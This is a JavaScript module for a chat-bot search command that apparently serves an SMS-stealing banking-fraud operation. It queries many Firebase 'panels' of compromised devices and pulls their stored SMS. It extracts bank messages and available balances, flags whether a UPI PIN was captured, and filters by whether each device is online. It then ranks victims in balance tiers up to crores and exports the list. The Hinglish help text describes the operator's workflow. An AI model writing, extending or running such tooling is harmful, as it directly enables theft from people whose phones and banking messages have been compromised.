import { fetchAllPanels, firebaseGet } from './panelCore.mjs';
import { processBankMessages } from './bankSms.mjs';

const TIERS = {
  low_high: { min: 2000, max: 50_000, label: 'BAL LOW->HIGH', sort: 'asc' },
  high_low: { min: 50_000, max: 9_000_000, label: 'BAL HIGH->LOW', sort: 'desc' },
  bank70k: { min: 70_000, max: 10_000_000, label: 'Bank 70K–1Cr', sort: 'desc' },
  user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
};

export function parseSearchCommand(text) {
  const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
  const isBankHigh = /^\/searchbank/i.test(text);
  const parts = raw.split(/[,|]/).map(s => s.trim().toLowerCase()).filter(Boolean);

  const opts = {
    keywords: [],
    online: true,
    offline: false,
    bothStatus: false,
    pinBoth: true,
    pinOnly: false,
    noPinOnly: false,
    days: 1,
    tier: isBankHigh ? 'bank70k' : 'low_high',
    bankOnly: true,
    avlBal: false,
  };

  for (const p of parts) {
    if (p === 'online') {
      opts.online = true;
      opts.offline = false;
      opts.bothStatus = false;
    } else if (p === 'offline') {
      opts.offline = true;
      opts.online = false;
      opts.bothStatus = false;
    } else if (p === 'both') {
      opts.bothStatus = true;
      opts.online = false;
      opts.offline = false;
    } else if (/^\d+\s*d(ays?)?$/.test(p) || /^last\s*\d+/.test(p)) {
      const n = parseInt(p.match(/\d+/)?.[0] || '1', 10);
      opts.days = n;
    } else if (p === 'high' || p === 'high-low') opts.tier = 'high_low';
    else if (p === 'low' || p === 'low-high') opts.tier = 'low_high';
    else if (/avl|bal/.test(p)) opts.avlBal = true;
    else if (p === 'bank' || p === 'bank online') opts.bankOnly = true;
    else if (p.includes('pin') && p.includes('no')) opts.pinBoth = true;
    else opts.keywords.push(p);
  }

  if (opts.bothStatus) {
    opts.online = false;
    opts.offline = false;
  }

  return opts;
}

function devicePassesStatus(d, opts) {
  if (opts.bothStatus) return true;
  if (opts.online && !opts.offline) return d.status;
  if (opts.offline && !opts.online) return !d.status;
  return true;
}

function devicePassesPin(d, opts) {
  if (opts.pinBoth) return true;
  if (opts.pinOnly) return d.hasPin;
  if (opts.noPinOnly) return !d.hasPin;
  return true;
}

function amountInTier(device, tier) {
  const amt = device.maxBalance || device.maxTxn || 0;
  return amt >= tier.min && amt <= tier.max;
}

async function fetchDeviceMessages(device, limit = 2000) {
  const extra = { orderBy: '"$key"', limitToLast: String(limit) };
  const params = new URLSearchParams({ auth: device.panelKey.trim(), ...extra });
  const url = `${device.panelUrl.replace(/\/$/, '')}/messages/${device.id}.json?${params}`;
  const res = await fetch(url, { headers: { Accept: 'application/json' } });
  if (!res.ok) return null;
  return res.json();
}

export function buildSearchHeader(opts, tier) {
  const pinPart = opts.pinBoth ? 'PIN: WITH + WITHOUT PIN' : 'PIN: FILTERED';
  const statPart = opts.bothStatus
    ? 'ONLINE + OFFLINE'
    : opts.online
      ? 'ONLINE DEVICES ONLY'
      : 'OFFLINE DEVICES ONLY';
  return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${tier.label}- LAST ${opts.days} DAY(S)`;
}

export function buildExportText(results, opts, tier, panelsTotal, elapsedMs) {
  const smsTotal = results.reduce((s, r) => s + (r.bankSms?.length || 0), 0);
  const lines = [
    buildSearchHeader(opts, tier),
    new Date().toLocaleString('en-IN', { hour12: false }).replace(',', ''),
    `Stats: Total Matches: ${smsTotal} | Devices: ${results.length} | DBs done: ${panelsTotal}/${panelsTotal} | ${(elapsedMs / 1000).toFixed(0)}s`,
    '',
  ];

  results.forEach((d, i) => {
    lines.push(`----------------+#[${i + 1}]-----------------`);
    lines.push(`Device ID: ${d.id}`);
    lines.push(`UPI PIN: ${d.hasPin ? 'YES' : 'NO'}`);
    if (d.maxBalance) lines.push(`Peak Avl Bal: Rs ${d.maxBalance.toLocaleString('en-IN')}`);
    lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | Panel: ${d.panelName || '—'}`);
    (d.bankSms || []).forEach((m, j) => {
      lines.push(`  ${j + 1}. [${m.sender}] ${m.text}`);
    });
    lines.push('');
  });
  return lines.join('\n');
}

export async function runSearch(panels, opts, onProgress) {
  const tier = TIERS[opts.tier] || TIERS.low_high;
  const t0 = Date.now();
  let devices = await fetchAllPanels(panels, {
    batch: 15,
    onProgress: (done, total, count) => {
      onProgress?.({ phase: 'panels', done, total, count });
    },
  });

  devices = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
  const results = [];
  const batch = 12;
  let scanned = 0;

  for (let i = 0; i < devices.length; i += batch) {
    const chunk = devices.slice(i, i + batch);
    await Promise.all(
      chunk.map(async d => {
        try {
          const data = await fetchDeviceMessages(d, opts.days <= 1 ? 1200 : 2500);
          const r = processBankMessages(data, opts.days);
          if (!r.bankSmsCount && !r.maxBalance) return;
          if (opts.avlBal && !r.maxBalance && !r.bankSms.some(m => /avl\s*bal/i.test(m.text))) return;
          const row = { ...d, bankSms: r.bankSms, maxBalance: r.maxBalance, maxTxn: r.maxTxn };
          const amt = row.maxBalance || row.maxTxn || 0;
          const inTier = amt >= tier.min && amt <= tier.max;
          if (inTier || (r.bankSmsCount > 0 && opts.bankOnly && amt === 0)) {
            if (inTier || r.bankSmsCount > 0) results.push(row);
          }
        } catch (_) {}
      })
    );
    scanned += chunk.length;
    onProgress?.({ phase: 'sms', done: scanned, total: devices.length, matched: results.length });
  }

  results.sort((a, b) => {
    const aa = a.maxBalance || a.maxTxn || 0;
    const ab = b.maxBalance || b.maxTxn || 0;
    return tier.sort === 'asc' ? aa - ab : ab - aa;
  });

  const text = buildExportText(results, opts, tier, panels.length, Date.now() - t0);
  return {
    results,
    text,
    stats: { devices: results.length, sms: results.reduce((s, r) => s + r.bankSms.length, 0) },
    elapsed: Date.now() - t0,
    tier,
    opts,
  };
}

export function searchHelpText() {
  return (
    '🔎 *Search Commands*\n\n' +
    'Quick:\n' +
    '`/search avl/bal, bank online`\n\n' +
    '🏦 High balance:\n' +
    '`/searchbank` ya `/searchbank bank online`\n\n' +
    'Flow:\n' +
    '`/search` → keywords → online/offline/both → days → Start\n\n' +
    '• `online` = live devices\n' +
    '• `offline` = dead\n' +
    '• `both` = dono\n' +
    '• `1d` `7d` = last N days\n' +
    '• `low` = 2K–50K | `high` = 50K–90L\n\n' +
    'Pehle file + caption `addtxt` se Firebase add karo.\n' +
    '/done = running search cancel'
  );
}
